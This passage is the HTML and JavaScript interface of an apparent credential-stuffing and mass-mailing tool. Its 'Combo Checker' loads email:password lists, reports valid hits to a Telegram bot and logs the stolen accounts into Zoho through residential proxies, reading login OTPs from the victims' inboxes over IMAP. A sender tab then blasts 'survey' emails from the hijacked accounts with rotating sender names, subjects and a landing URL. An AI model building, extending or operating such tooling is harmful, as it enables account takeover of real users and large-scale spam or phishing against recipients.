          placeholder="Research Team&#10;Customer Team&#10;Support Team&#10;Marketing Team"></textarea>
      </div>
      <div>
        <label>Subjects (one per line)</label>
        <textarea class="opts-ta" id="subjects"
          placeholder="Quick Survey - Your Opinion Matters&#10;We'd Love Your Feedback!&#10;Help Us Improve - 3 Min Survey"></textarea>
      </div>
    </div>
    <div style="display:flex;gap:8px;align-items:center">
      <div style="flex:1">
        <label>Rotate every N batches (1 = every 100 emails)</label>
        <input type="text" id="rotate_every" value="1" style="max-width:80px">
      </div>
      <button onclick="saveOpts()"
        style="padding:6px 14px;background:var(--accent);color:#fff;font-weight:700;
          border:none;border-radius:5px;cursor:pointer;font-size:10px;align-self:flex-end">
         Save Options</button>
    </div>
  </div>
</div>

<!-- TEMPLATES -->
<div class="card">
  <div class="ch"><span class="ci"></span><span class="ct">Email Templates</span>
    <span style="margin-left:6px;font-size:9px;color:var(--muted)">multiple = random rotation</span>
    <button class="btn-s" onclick="addTemplate()" style="margin-left:auto;font-size:9px">+ Add Template</button>
  </div>
  <div class="cb" id="tpl-list" style="gap:10px">
    <!-- rendered by JS -->
  </div>
  <div style="padding:8px 13px;border-top:1px solid var(--border)">
    <button onclick="saveTemplates()"
      style="padding:6px 18px;background:var(--accent);color:#fff;font-weight:700;
        border:none;border-radius:5px;cursor:pointer;font-size:10px">
       Save All Templates</button>
  </div>
</div>

<div class="card">
  <div class="ch"><span class="ci"></span><span class="ct">Preview (Template 1)</span>
    <button onclick="rp()" class="btn-s" style="margin-left:auto;font-size:9px"> Refresh</button>
  </div>
  <div style="background:#e8e8e8;border-radius:0 0 10px 10px;overflow:hidden;min-height:180px">
    <iframe id="pf" style="width:100%;min-height:200px;border:none;display:block"></iframe>
  </div>
</div>

</div><!-- /tab-design -->
</div><!-- /content -->

<!-- LOG PANEL -->
<div class="log">
  <div class="log-hdr">
    <span class="log-title" id="log-lbl"> Check Log</span>
    <button class="btn-clear" onclick="clearLog()">Clear</button>
  </div>
  <div id="log"></div>
  <div class="send-wrap" id="send-wrap" style="display:none">
    <button id="send-btn" onclick="sendCampaign()">
      <span></span><span id="send-lbl">Send Campaign</span>
    </button>
  </div>
</div>
</div><!-- /wrap -->

<!-- CONNECT DIALOG -->
<div class="overlay" id="dlg-overlay">
  <div class="dialog">
    <h3>Connect Combo to Profile <span id="dlg-prof">#1</span></h3>
    <div>
      <label>Email</label>
      <input type="text" id="dlg-email" readonly style="color:#60a5fa">
    </div>
    <div>
      <label>Password (from combo)</label>
      <input type="password" id="dlg-pw">
    </div>
    <div style="font-size:10px;color:var(--muted);line-height:1.6">
      Script will:<br>
      1. Open browser with the selected profile<br>
      2. Login to Zoho via <strong>Email OTP</strong><br>
      3. Read OTP from inbox via IMAP<br>
      4. Save session + mark as registered in DB
    </div>
    <div class="dialog-btns">
      <button class="d-cancel" onclick="closeDlg()">Cancel</button>
      <button class="d-ok" onclick="doConnect()"> Connect</button>
    </div>
  </div>
</div>

<script>
//  State 
let _tab       = 'checker';
let _logoMode  = 'url';
let _logoData  = '';
let _recipMode = 'text';
let _recipFile = '';
let _comboFile = '';
let _checkPoll = null;
let _sendPoll  = null;
let _dlgEmail  = '';
let _dlgPw     = '';
let _dlgProfIdx = 1;
let _templates  = [];

const gv = id => { const e=document.getElementById(id); return e?(e.value||''):''; }
function addLog(tag,msg){
  const b=document.getElementById('log');
  const s=document.createElement('span');
  s.className='ll '+tag; s.textContent=msg;
  b.appendChild(s); b.appendChild(document.createElement('br'));
  b.scrollTop=b.scrollHeight;
}
function clearLog(){document.getElementById('log').innerHTML='';}

//  TABS 
function switchTab(t,btn){
  _tab=t;
  document.querySelectorAll('.page').forEach(p=>p.classList.remove('active'));
  document.getElementById('tab-'+t).classList.add('active');
  document.querySelectorAll('.tab').forEach(b=>b.classList.remove('active'));
  if(btn)btn.classList.add('active');
  const labels={checker:' Check Log',profiles:' Connect Log',
    sender:' Send Log',design:' Send Log'};
  document.getElementById('log-lbl').textContent=labels[t]||' Log';
  const showSend=t==='sender'||t==='design';
  document.getElementById('send-wrap').style.display=showSend?'':'none';
  if(t==='profiles') refreshProfiles();
  if(t==='design'){setTimeout(rp,50);loadTemplatesUI();loadOptsUI();}
  if(t==='sender') refreshProfSelect();
}

//  COMBO CHECKER 
async function pickCombo(){
  const r=await pywebview.api.pick_combo_file();
  if(!r||!r.path)return;
  _comboFile=r.path;
  document.getElementById('combo-info').textContent=
    r.path.split('\\').pop()+`  (${r.count.toLocaleString()} combos)`;
}

async function startCheck(){
  if(!_comboFile){addLog('err','  Load a combo file first');return;}
  ['st-total','st-checked','st-valid','st-invalid','st-skipped','st-pct'].forEach(id=>{
    document.getElementById(id).textContent = id==='st-pct'?'0%':'0';
  });
  document.getElementById('prog-bar').style.width='0%';
  document.getElementById('prog-txt').textContent='0 / 0 (0%)';
  const resumeBtn=document.getElementById('resume-btn');
  if(resumeBtn) resumeBtn.style.display='none';
  const ps=document.getElementById('prog-status');
  ps.textContent='RUNNING'; ps.style.color='var(--yellow)';

  const poolLimit = parseInt(document.getElementById('pool-limit-inp').value)||50;
  const resumeAt  = parseInt(document.getElementById('resume-at-inp').value)||10;
  const r=await pywebview.api.start_checking({
    file:_comboFile, tg_token:gv('tg_token'), tg_chat:gv('tg_chat'),
    pool_limit: poolLimit, resume_at: resumeAt
  });
  if(r&&r.error){addLog('err','  '+r.error);return;}
  setPill('check','run','RUNNING');
  addLog('info',`  Checking ${r.count.toLocaleString()} combos  pool limit: ${r.pool_limit} / resume at: ${r.resume_at}`);
  startCheckPoll();
}

async function stopCheck(){
  await pywebview.api.stop_checking();
  setPill('check','idle','STOPPED');
  const ps=document.getElementById('prog-status');
  ps.textContent='STOPPED'; ps.style.color='var(--red)';
  // Wait a moment for thread to flush checkpoint to disk
  await new Promise(r=>setTimeout(r,600));
  const s=await pywebview.api.get_check_stats();
  const resumeBtn=document.getElementById('resume-btn');
  if(resumeBtn&&s&&s.combos_left>0){
    resumeBtn.style.display='inline-block';
    resumeBtn.textContent=` Resume from #${s.checkpoint.toLocaleString()} / ${s.total.toLocaleString()} (${(s.combos_left||0).toLocaleString()} left)`;
  }
}

async function resumeCheck(){
  const r=await pywebview.api.resume_checking({tg_token:gv('tg_token'),tg_chat:gv('tg_chat')});
  if(r&&r.error){addLog('err','  Cannot resume: '+r.error);return;}
  document.getElementById('resume-btn').style.display='none';
  setPill('check','run','RUNNING');
  const ps=document.getElementById('prog-status');
  ps.textContent='RUNNING'; ps.style.color='var(--yellow)';
  addLog('info',`  Resumed from #${r.from.toLocaleString()} / ${r.total.toLocaleString()}`);
  startCheckPoll();
}

function startCheckPoll(){
  if(_checkPoll)clearInterval(_checkPoll);
  _checkPoll=setInterval(async()=>{
    const s=await pywebview.api.get_check_stats();
    if(s&&s.total>0){
      const pct=Math.round(s.checked/s.total*100);
      const hit=s.checked>0?(s.valid/s.checked*100).toFixed(1)+'%':'0%';
      document.getElementById('st-total').textContent=s.total.toLocaleString();
      document.getElementById('st-checked').textContent=s.checked.toLocaleString();
      document.getElementById('st-valid').textContent=s.valid.toLocaleString();
      document.getElementById('st-invalid').textContent=s.invalid.toLocaleString();
      document.getElementById('st-skipped').textContent=(s.skipped||0).toLocaleString();
      document.getElementById('st-pct').textContent=hit;
      document.getElementById('prog-bar').style.width=pct+'%';
      document.getElementById('prog-txt').textContent=
        `${s.checked.toLocaleString()} / ${s.total.toLocaleString()}  (${pct}%)`;

      // Pool bar
      const pool=s.pool||0, plimit=s.pool_limit||50, resumeAt=s.resume_at||10;
      const poolPct=Math.min(100,Math.round(pool/plimit*100));
      const poolBar=document.getElementById('pool-bar');
      const poolTxt=document.getElementById('pool-txt');
      const poolStatus=document.getElementById('pool-status');
      if(poolBar){
        poolBar.style.width=poolPct+'%';
        poolBar.style.background=pool>=plimit?'var(--red)':pool>=resumeAt?'var(--yellow)':'var(--green)';
      }
      if(poolTxt) poolTxt.textContent=`${pool} / ${plimit} unconnected valid`;
      if(poolStatus){
        if(s.paused){
          poolStatus.textContent=`PAUSED  pool full  |  resumes when < ${resumeAt}  |  left: ${(s.combos_left||0).toLocaleString()}`;
          poolStatus.style.color='var(--yellow)';
          document.getElementById('prog-status').textContent='PAUSED';
          document.getElementById('prog-status').style.color='var(--yellow)';
        } else if(s.running){
          poolStatus.textContent=`Checking  pool: ${pool}/${plimit}  checkpoint: #${s.checkpoint||0}`;
          poolStatus.style.color='var(--green)';
        } else {
          poolStatus.textContent=`Idle  pool: ${pool}/${plimit}`;
          poolStatus.style.color='var(--muted)';
        }
        // Show resume button if paused with remaining combos
        const resumeBtn=document.getElementById('resume-btn');
        if(resumeBtn){
          if((s.paused||!s.running)&&s.checkpoint>0&&s.combos_left>0){
            resumeBtn.style.display='inline-block';
            resumeBtn.textContent=` Resume from #${s.checkpoint.toLocaleString()} (${(s.combos_left||0).toLocaleString()} left)`;
          } else if(s.running){
            resumeBtn.style.display='none';
          }
        }
      }
    }
    const msgs=await pywebview.api.poll_check_logs();
    if(msgs&&msgs.length)msgs.forEach(([t,m])=>addLog(t,m));
    const valids=await pywebview.api.get_valid_combos();
    renderValid(valids);
    document.getElementById('valid-cnt').textContent=valids.length;
    // Update DB badge
    const dbr=await pywebview.api.get_db_stats();
    document.getElementById('db-cnt').textContent=`DB: ${dbr.count} registered`;
  },600);
}

async function renderValid(valids){
  const tb=document.getElementById('valid-tbody');
  if(!valids||!valids.length){
    tb.innerHTML='<tr><td colspan="6" style="text-align:center;color:var(--muted);padding:16px">No valid combos yet</td></tr>';
    return;
  }
  window._validsList = valids;
  tb.innerHTML=valids.map((v,i)=>`
    <tr>
      <td><strong style="color:#60a5fa">${v.email}</strong>
        <br><span style="color:var(--muted);font-size:8px">${''.repeat(Math.min(8,(v.password||'').length))} ...</span></td>
      <td style="font-size:9px;color:var(--muted)">${v.server||''}</td>
      <td style="font-size:9px;color:var(--muted)">${v.found_at||''}</td>
      <td>${v.connected_profile!=null
        ?`<span class="badge b-conn">Profile ${v.connected_profile}</span>`
        :'<span class="badge b-no">Not connected</span>'}</td>
      <td><span class="badge ${v._indb?'b-skip':'b-ok'}">${v._indb?'In DB':'New'}</span></td>
      <td>
        ${v.blocked
          ?`<span style="color:var(--red);font-size:9px"> Blocked</span>`
          :v.connected_profile==null
            ?`<button class="conn-btn" onclick="openConnectDlgIdx(${i})">Connect </button>`
            :`<span style="color:var(--green);font-size:9px"> Active</span>`}
      </td>
    </tr>`).join('');
}
function openConnectDlgIdx(i){
  const v=window._validsList&&window._validsList[i];
  if(v) openConnectDlg(v.email,v.password);
}

function onNewValid(){/* handled by poll */}
async function onCheckDone(){
  setPill('check','idle','DONE');
  const ps3=document.getElementById('prog-status');
  ps3.textContent='DONE'; ps3.style.color='var(--green)';
  const s=await pywebview.api.get_check_stats();
  if(s&&s.total>0){
    const hit=s.checked>0?(s.valid/s.checked*100).toFixed(1)+'%':'0%';
    document.getElementById('prog-bar').style.width='100%';
    document.getElementById('prog-txt').textContent=
      `Done: ${s.checked.toLocaleString()} checked | ${s.valid} valid | ${s.skipped||0} skipped | hit ${hit}`;
    document.getElementById('st-pct').textContent=hit;
  }
  if(_checkPoll){clearInterval(_checkPoll);_checkPoll=null;}
  const valids=await pywebview.api.get_valid_combos();
  renderValid(valids);
  document.getElementById('valid-cnt').textContent=valids.length;
  const dbr=await pywebview.api.get_db_stats();
  document.getElementById('db-cnt').textContent=`DB: ${dbr.count} registered`;
}
async function clearValid(){
  if(!confirm('Clear all valid combos?'))return;
  await pywebview.api.clear_valid_combos();
  renderValid([]);
  document.getElementById('st-valid').textContent='0';
  document.getElementById('valid-cnt').textContent='0';
}

//  CONNECT DIALOG 
function openConnectDlg(email,pw){
  _dlgEmail=email; _dlgPw=pw;
  pywebview.api.get_profiles().then(profs=>{
    const free=profs.find(p=>p.status==='free');
    if(!free){addLog('err','  No free profile  disconnect or add proxy profile');return;}
    _dlgProfIdx=free.idx;
    document.getElementById('dlg-prof').textContent='#'+free.idx;
    document.getElementById('dlg-email').value=email;
    document.getElementById('dlg-pw').value=pw;
    document.getElementById('dlg-overlay').classList.add('show');
  });
}
function closeDlg(){document.getElementById('dlg-overlay').classList.remove('show');}
async function doConnect(){
  closeDlg();
  addLog('info',`  Connecting ${_dlgEmail}  Profile ${_dlgProfIdx}...`);
  const r=await pywebview.api.connect_profile({
    email:_dlgEmail,password:_dlgPw,profile_idx:_dlgProfIdx,
    tg_token:gv('tg_token'),tg_chat:gv('tg_chat')
  });
  if(r&&r.error)addLog('err','  '+r.error);
}

//  PROFILES 
async function refreshProfiles(){
  const profs=await pywebview.api.get_profiles();
  renderProfiles(profs);
}

async function checkSessionsHealth(){
  const btn=document.getElementById('btn-health');
  if(btn){btn.disabled=true;btn.textContent=' Checking...';}
  addLog('info','Checking all active sessions...');
  const r=await pywebview.api.check_sessions_health();
  if(r&&r.ok){
    if(r.checking===0){
      addLog('info','No active profiles to check');
    } else {
      addLog('info',`Checking ${r.checking} profile(s)  watch the log below`);
    }
  }
  // Re-enable button after 30s and refresh profiles
  setTimeout(async()=>{
    if(btn){btn.disabled=false;btn.textContent=' Refresh & Check Sessions';}
    await refreshProfiles();
  }, 30000);
  // Also auto-refresh every 10s while checking
  let ticks=0;
  const iv=setInterval(async()=>{
    ticks++;
    await refreshProfiles();
    if(ticks>=6)clearInterval(iv);
  },10000);
}

function trialBar(days,hours){
  if(days===null||days===undefined)return'<div class="trial-info">Trial info N/A</div>';
  const total=7;
  const pct=Math.max(0,Math.min(100,((days*24+hours)/(total*24))*100));
  const cls=days>=2?'trial-ok':days>=1?'trial-warn':'trial-exp';
  const label=days>0?`${days}d ${hours}h left`:(hours>0?`${hours}h left`:'EXPIRED');
  return`<div class="trial-bar"><div class="trial-fill ${cls}" style="width:${pct}%"></div></div>
    <div class="trial-info">Trial: ${label}</div>`;
}

function renderProfiles(profs){
  const g=document.getElementById('profs-grid');
  g.innerHTML=profs.map(p=>{
    const isFree=p.status==='free';
    const isActive=p.status==='active';
    const isBusy=p.status==='busy';
    const isErr=p.health&&p.health!=='ok'&&p.health!==null;
    const isExp=p.health==='trial_expired';
    const stClass=isFree?'ps-free':isActive?(isErr?'ps-error':'ps-active'):'ps-busy';
    const stLabel=isFree?'FREE':isActive?(isErr?'ERROR':'ACTIVE'):'BUSY';
    const cardClass=isExp?'expired':isErr?'error':isActive?'active':isBusy?'busy':'';
    const sentBadge=p.sent_count>0
      ?`<span style="font-size:8px;color:var(--muted);margin-left:auto"> ${(p.sent_count||0).toLocaleString()} sent</span>`:'';
    const healthNote=isErr&&p.health?`<div style="font-size:8px;color:var(--red);margin-top:2px"> ${p.health}</div>`:'';
    const connDate=p.connected_at?`<div style="font-size:8px;color:var(--muted)">Connected: ${p.connected_at}</div>`:'';
    return `<div class="prof-card ${cardClass}">
      <div class="prof-hdr">
        <div class="prof-idx">#${p.idx}</div>
        <span class="prof-status ${stClass}">${stLabel}</span>
        ${sentBadge}
      </div>
      ${p.email?`<div class="prof-email">${p.email}</div>`:'<div class="prof-email" style="color:var(--muted)">No account</div>'}
      ${connDate}
      ${isActive?trialBar(p.trial_days_left,p.trial_hours_left):''}
      ${healthNote}
      <div>
        <input class="prof-proxy" id="prx-${p.idx}"
          value="${p.proxy||''}" placeholder="host:port or user:pass@host:port"
          title="Residential proxy for this profile">
        <div style="margin-top:4px;display:flex;gap:4px">
          <button class="prof-btn pb-proxy" onclick="saveProxy(${p.idx})">Save Proxy</button>
        </div>
      </div>
      <div class="prof-actions">
        ${isFree
          ?'<button class="prof-btn pb-connect" onclick="openConnectDlgForProf('+p.idx+')">Connect</button>'
          :isActive
            ?`<button class="prof-btn pb-switch" onclick="switchProfileAccount(${p.idx})"> Switch</button>
              <button class="prof-btn pb-disconnect" onclick="disconnectProf(${p.idx})">Disconnect</button>`
            :'<button class="prof-btn" style="background:#451a03;color:var(--yellow)" disabled>Connecting...</button>'}
      </div>
    </div>`;
  }).join('');
}

async function openConnectDlgForProf(profIdx){
  const valids=await pywebview.api.get_valid_combos();
  const unconnected=valids.filter(v=>v.connected_profile==null);
  if(!unconnected.length){
    addLog('err','  No unconnected valid combos  run Combo Checker first');return;
  }
  const v=unconnected[0];
  _dlgEmail=v.email; _dlgPw=v.password; _dlgProfIdx=profIdx;
  document.getElementById('dlg-prof').textContent='#'+profIdx;
  document.getElementById('dlg-email').value=v.email;
  document.getElementById('dlg-pw').value=v.password;
  document.getElementById('dlg-overlay').classList.add('show');
}

async function disconnectProf(idx){
  await pywebview.api.disconnect_profile(idx);
  refreshProfiles();
}

async function saveProxy(idx){
  const prxEl=document.getElementById('prx-'+idx);
  if(!prxEl)return;
  const r=await pywebview.api.save_profile_proxy({idx,proxy:prxEl.value});
  if(r&&r.ok){addLog('ok','  Proxy saved for Profile '+idx);refreshProfiles();}
}

async function addProfile(){
  const proxy=document.getElementById('new-proxy').value.trim();
  if(!proxy){addLog('err','  Proxy required to add a new profile');return;}
  const r=await pywebview.api.add_profile(proxy);
  if(r&&r.ok){document.getElementById('new-proxy').value='';setTimeout(refreshProfiles,600);}
}

async function switchProfileAccount(profIdx){
  addLog('info',`  Switching Profile ${profIdx} to next available combo...`);
  const r=await pywebview.api.switch_profile_account({
    profile_idx:profIdx,tg_token:gv('tg_token'),tg_chat:gv('tg_chat')
  });
  if(r&&r.ok) setTimeout(refreshProfiles,500);
}

async function refreshProfSelect(){
  const profs=await pywebview.api.get_profiles();
  const sel=document.getElementById('prof-select');
  const cur=sel.value;
  sel.innerHTML='<option value="">Default  Oscar (ZohoTestProf_Oscar)</option><option value="all">&#9733; All Active Profiles</option>';
  profs.filter(p=>p.status==='active').forEach(p=>{
    const o=document.createElement('option');
    o.value=p.idx; o.textContent=`Profile ${p.idx}  ${p.email}`;
    sel.appendChild(o);
  });
  sel.value=cur;
}

//  EMAIL SENDER 
function switchRecip(mode,btn){
  _recipMode=mode;
  document.querySelectorAll('#tab-sender .mt-row .mt').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('recip-text-w').style.display=mode==='text'?'':'none';
  document.getElementById('recip-file-w').style.display=mode==='file'?'':'none';
}

function updCtr(){
  const raw=gv('recip');
  const emails=raw.replace(/,/g,'\n').split('\n').filter(l=>l.trim()&&l.includes('@'));
  const bs=Math.max(1,parseInt(gv('batch_size'))||100);
  const n=Math.ceil(emails.length/bs)||0;
  document.getElementById('rctr').textContent=
    `${emails.length.toLocaleString()} emails  ${n} batch${n!==1?'es':''} of ${bs} (each batch = 1 Zoho Survey invite)`;
}

async function pickRecip(){
  const r=await pywebview.api.pick_file('recip');
  if(!r||!r.path)return;
  _recipFile=r.path;
  const cnt=await pywebview.api.count_file(r.path);
  const bs=Math.max(1,parseInt(gv('batch_size'))||100);
  document.getElementById('recip-fi').textContent=
    r.path.split('\\').pop()+` (${cnt.toLocaleString()} emails)`;
  document.getElementById('rctr').textContent=
    `${cnt.toLocaleString()} emails  ${Math.ceil(cnt/bs)} batches of ${bs}`;
}

async function sendCampaign(){
  const btn=document.getElementById('send-btn');
  if(btn.disabled)return;
  const profIdx=gv('prof-select');
  const cfg={
    portal:gv('portal'),dept:gv('dept'),survey:gv('survey'),
    logo_src:_logoMode==='file'?_logoData:gv('logo_url'),
    banner1:gv('banner1'),banner2:gv('banner2'),
    landing_url:gv('landing_url'),footer_text:gv('footer_text'),
    hidden_browser:document.getElementById('hidden_browser')?.checked||false,
    batch_size:gv('batch_size'),cd_min:gv('cd_min'),cd_max:gv('cd_max'),
    reply_to:gv('reply_to'),send_mode:gv('send_mode')||'now',
    schedule_dt:gv('schedule_dt'),
    end_page_type:gv('end_page_type')||'default',
    end_page_url:gv('end_page_url'),end_page_msg:gv('end_page_msg'),
  };
  let r;
  if(profIdx==='all'){
    r=await pywebview.api.send_all_profiles({
      cfg, emails:_recipMode==='text'?gv('recip'):'',
      file_path:_recipMode==='file'?_recipFile:'',
    });
    if(r&&r.ok)addLog('info',`  All Profiles  ${r.count} emails  ${r.profiles} profiles  ${r.batches} batches`);
  } else {
    r=await pywebview.api.send({
      cfg, emails:_recipMode==='text'?gv('recip'):'',
      file_path:_recipMode==='file'?_recipFile:'',
      test_email:gv('test_email'),
      profile_idx:profIdx?parseInt(profIdx):null,
    });
    if(r&&r.ok)addLog('info',`  Started  ${r.count} emails  ${r.batches} batches`);
  }
  if(r&&r.error){addLog('err','  '+r.error);return;}
  btn.disabled=true;
  document.getElementById('send-lbl').textContent='Sending';
  setPill('send','run','SENDING');
  _sendPoll=setInterval(async()=>{
    const msgs=await pywebview.api.poll_send_logs();
    if(msgs&&msgs.length)msgs.forEach(([t,m])=>addLog(t,m));
  },300);
}

function onSendDone(){
  setPill('send','idle','IDLE');
  const btn=document.getElementById('send-btn');
  btn.disabled=false;
  document.getElementById('send-lbl').textContent='Send Campaign';
  if(_sendPoll){clearInterval(_sendPoll);_sendPoll=null;}
}

//  DESIGN 
function switchLogo(mode,btn){
  _logoMode=mode;
  document.querySelectorAll('#tab-design .mt-row .mt').forEach(b=>b.classList.remove('active'));
  btn.classList.add('active');
  document.getElementById('logo-url-w').style.display=mode==='url'?'':'none';
  document.getElementById('logo-file-w').style.display=mode==='file'?'':'none';
  rp();
}
async function pickLogo(){
  const r=await pywebview.api.pick_file('logo');
  if(!r||!r.path)return;
  _logoData=r.data||'';
  document.getElementById('logo-fi').textContent=r.path.split('\\').pop();
  document.getElementById('logo-prev').innerHTML=
    `<img src="${_logoData}" style="max-height:44px;border-radius:5px">`;
  rp();
}
function syncC(id,val){document.getElementById(id).value=val;}
function syncC2(id,val){if(/^#[0-9a-f]{6}$/i.test(val))document.getElementById('c_'+id).value=val;}

//  TEMPLATES 
async function loadTemplatesUI(){
  _templates=await pywebview.api.get_templates();
  renderTemplatesUI();
}

function renderTemplatesUI(){
  const list=document.getElementById('tpl-list');
  if(!_templates.length)_templates=[{title:'',subtitle:'',body:'',show_title:false,show_icons:true}];
  list.innerHTML=_templates.map((t,i)=>`
    <div class="tpl-item" id="tpl-${i}">
      <button class="tpl-del" onclick="delTemplate(${i})"></button>
      <div class="g2">
        <div><label>Title (header text)</label>
          <input type="text" id="tpl-title-${i}" value="${_esc(t.title||'')}"
            placeholder="We'd Love Your Feedback!" oninput="syncTpl(${i})"></div>
        <div><label>Subtitle</label>
          <input type="text" id="tpl-sub-${i}" value="${_esc(t.subtitle||'')}"
            placeholder="Your opinion shapes our future" oninput="syncTpl(${i})"></div>
      </div>
      <div style="display:flex;gap:16px;margin:6px 0 4px">
        <label style="display:flex;align-items:center;gap:5px;font-size:10px;cursor:pointer">
          <input type="checkbox" id="tpl-showtitle-${i}" ${t.show_title?'checked':''} onchange="syncTpl(${i})">
          Show title in header</label>
        <label style="display:flex;align-items:center;gap:5px;font-size:10px;cursor:pointer">
          <input type="checkbox" id="tpl-showicons-${i}" ${t.show_icons!==false?'checked':''} onchange="syncTpl(${i})">
          Show 3 icons (&#9201;&#128274;&#127919;)</label>
      </div>
      <div><label>Body (HTML allowed)</label>
        <textarea id="tpl-body-${i}" oninput="syncTpl(${i})">${_esc(t.body||'')}</textarea>
      </div>
    </div>`).join('');
}

function _esc(s){return String(s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');}

function syncTpl(i){
  if(!_templates[i])return;
  _templates[i].title      = document.getElementById('tpl-title-'+i)?.value||'';
  _templates[i].subtitle   = document.getElementById('tpl-sub-'+i)?.value||'';
  _templates[i].body       = document.getElementById('tpl-body-'+i)?.value||'';
  _templates[i].show_title = document.getElementById('tpl-showtitle-'+i)?.checked||false;
  _templates[i].show_icons = document.getElementById('tpl-showicons-'+i)?.checked!==false;
  if(i===0) rp();
}

function addTemplate(){
  _templates.push({
    title:'We\'d Love Your Feedback!',
    subtitle:'Your opinion shapes our future',
    body:'We are conducting a <strong>short 3-minute survey</strong> to better understand your needs.',
    show_title:false,
    show_icons:true
  });
  renderTemplatesUI();
}

function delTemplate(i){
  if(_templates.length<=1){addLog('err','  Need at least 1 template');return;}
  _templates.splice(i,1);
  renderTemplatesUI();
}

async function saveTemplates(){
  // Sync all from DOM before save
  _templates.forEach((_,i)=>syncTpl(i));
  const r=await pywebview.api.save_templates(_templates);
  if(r&&r.ok)addLog('ok','  Templates saved ('+_templates.length+')');
}

//  SEND OPTIONS 
async function loadOptsUI(){
  const opts=await pywebview.api.get_send_options();
  document.getElementById('sender_names').value=(opts.sender_names||['Research Team']).join('\n');
  document.getElementById('subjects').value=(opts.subjects||['Quick Survey']).join('\n');
  document.getElementById('rotate_every').value=opts.rotate_every||1;
}

async function saveOpts(){
  const names=gv('sender_names').split('\n').map(s=>s.trim()).filter(Boolean);
  const subs=gv('subjects').split('\n').map(s=>s.trim()).filter(Boolean);
  const re=parseInt(gv('rotate_every'))||1;
  if(!names.length||!subs.length){addLog('err','  Need at least 1 sender name and 1 subject');return;}
  const r=await pywebview.api.save_send_options({sender_names:names,subjects:subs,rotate_every:re});
  if(r&&r.ok)addLog('ok',`  Options saved  ${names.length} names, ${subs.length} subjects, rotate every ${re} batch(es)`);
}

//  PREVIEW 
function rp(){
  const iframe=document.getElementById('pf'); if(!iframe)return;
  const b1=gv('banner1')||'#0057b8',b2=gv('banner2')||'#00a3e0';
  const logo=_logoMode==='file'?_logoData:gv('logo_url');
  const lh=logo?`<img src="${logo}" style="max-height:44px;display:block;margin:0 auto 8px;object-fit:contain">`:'';
  const t0=_templates[0]||{};
  const tit=t0.title||"We'd Love Your Feedback!";
  const sub=t0.subtitle||'';
  const bdy=(t0.body||'').replace(/&lt;/g,'<').replace(/&gt;/g,'>').replace(/&amp;/g,'&');
  const showTitle=t0.show_title||false;
  const showIcons=t0.show_icons!==false;
  const landingUrl=gv('landing_url')||'';
  const footerText=gv('footer_text')||'';
  const titleHtml=showTitle?`<h1 style="color:#fff;font-size:18px;font-weight:700;margin:0 0 4px;font-family:Arial">${tit}</h1>`:'';
  const bannerInner=`${lh}${titleHtml}<p style="color:rgba(255,255,255,.82);font-size:11px;margin:4px 0 0;font-family:Arial">${sub}</p>`;
  const bannerContent=landingUrl?`<a href="${landingUrl}" style="display:block;text-decoration:none">${bannerInner}</a>`:bannerInner;
  const iconsHtml=showIcons?`<table width="100%" cellpadding="0" cellspacing="0" style="border-top:1px solid #eee;padding-top:10px"><tr>
<td style="text-align:center;padding:6px"><p style="font-size:18px;margin:0 0 2px"></p><p style="color:${b1};font-weight:700;font-size:10px;margin:0;font-family:Arial">3 Minutes</p></td>
<td style="text-align:center;padding:6px"><p style="font-size:18px;margin:0 0 2px"></p><p style="color:${b1};font-weight:700;font-size:10px;margin:0;font-family:Arial">Anonymous</p></td>
<td style="text-align:center;padding:6px"><p style="font-size:18px;margin:0 0 2px"></p><p style="color:${b1};font-weight:700;font-size:10px;margin:0;font-family:Arial">Impactful</p></td>
</tr></table>`:'';
  const footerExtra=footerText?`<p style="color:#aaa;font-size:9px;margin:6px 0 0;font-family:Arial;text-align:center">${footerText}</p>`:'';
  iframe.srcdoc=`<!DOCTYPE html><html><head><meta charset="UTF-8">
<style>body{margin:0;background:#f0f0f0;font-family:Arial}
.w{max-width:520px;margin:12px auto;background:#fff;border-radius:8px;overflow:hidden;box-shadow:0 2px 8px #0002}
.zf{padding:12px 20px;background:#fafafa;border-top:1px solid #eee;text-align:center}
.zb{display:inline-block;background:${b1};color:#fff;padding:8px 24px;border-radius:4px;font-size:11px;font-weight:700;text-decoration:none}
.zt{color:#aaa;font-size:9px;margin-top:6px;line-height:1.6}</style></head>
<body><div class="w">
<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse">
<tr><td style="background:linear-gradient(135deg,${b1},${b2});padding:18px 20px 13px;text-align:center">
${bannerContent}
</td></tr></table>
<table width="100%" cellpadding="0" cellspacing="0" style="border-collapse:collapse">
<tr><td style="padding:14px 20px 10px;background:#fff">
<p style="color:#555;font-size:13px;line-height:1.7;margin:0 0 8px;font-family:Arial">Dear Participant,</p>
<p style="color:#555;font-size:13px;line-height:1.7;margin:0 0 12px;font-family:Arial">${bdy}</p>
${iconsHtml}${footerExtra}</td></tr></table>
<div class="zf"><a class="zb" href="#">Begin Survey</a>
<div class="zt">Unsubscribe  Powered by Zoho Survey</div></div>
</div></body></html>`;
}

//  PILLS 
function setPill(which,cls,txt){
  document.getElementById(which+'-pill').className='pill '+cls;
  document.getElementById(which+'-txt').textContent=txt;
}

//  CFG 
function toggleEndPageFields(){
  const t=gv('end_page_type');
  document.getElementById('ep_url_wrap').style.display=t==='redirect'?'':'none';
  document.getElementById('ep_msg_wrap').style.display=t==='message'?'':'none';
}
function toggleSchedule(){
  const m=gv('send_mode');
  document.getElementById('schedule_wrap').style.display=m==='schedule'?'':'none';
  saveCfg();
}
async function saveCfg(){
  const cfg={portal:gv('portal'),dept:gv('dept'),survey:gv('survey'),
    banner1:gv('banner1'),banner2:gv('banner2'),
    landing_url:gv('landing_url'),footer_text:gv('footer_text'),
    batch_size:gv('batch_size'),cd_min:gv('cd_min'),cd_max:gv('cd_max'),
    tg_token:gv('tg_token'),tg_chat:gv('tg_chat'),
    reply_to:gv('reply_to'),send_mode:gv('send_mode'),
    schedule_dt:gv('schedule_dt'),
    end_page_type:gv('end_page_type'),end_page_url:gv('end_page_url'),
    end_page_msg:gv('end_page_msg'),
    captcha_key:gv('captcha_key'),proxy_str:gv('proxy_str')};
  await pywebview.api.save_cfg(cfg); addLog('ok','  Config saved');
}
async function loadCfg(){
  const c=await pywebview.api.load_cfg();
  if(!c) return;
  const m={portal:'portal',dept:'dept',survey:'survey',
    banner1:'banner1',banner2:'banner2',
    landing_url:'landing_url',footer_text:'footer_text',
